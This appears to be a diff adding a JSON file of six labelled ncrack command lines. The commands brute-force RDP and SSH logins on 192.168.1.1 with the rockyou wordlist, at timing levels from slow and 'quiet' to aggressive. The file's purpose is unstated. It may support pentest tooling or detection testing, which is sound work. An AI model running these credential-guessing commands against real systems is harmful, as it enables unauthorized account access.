@@ -1,0 +1,8 @@
+{
+  "Ncrack - Slow RDP Probe": "ncrack -u admin -P /usr/share/wordlists/rockyou.txt -T 1 rdp://192.168.1.1",
+  "Ncrack - Quiet Single Attempt": "ncrack -u admin -p Winter2024! rdp://192.168.1.1",
+  "Ncrack - Full Aggressive RDP": "ncrack -U /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt -T 5 rdp://192.168.1.1",
+  "Ncrack - Multi-Service Blast": "ncrack -u admin -P /usr/share/wordlists/rockyou.txt -T 5 rdp://192.168.1.1 ssh://192.168.1.1",
+  "Ncrack - Credential Test": "ncrack -u admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
+  "Ncrack - Focused SSH Test": "ncrack -u admin -P /usr/share/wordlists/rockyou.txt -T 3 ssh://192.168.1.1"
+}
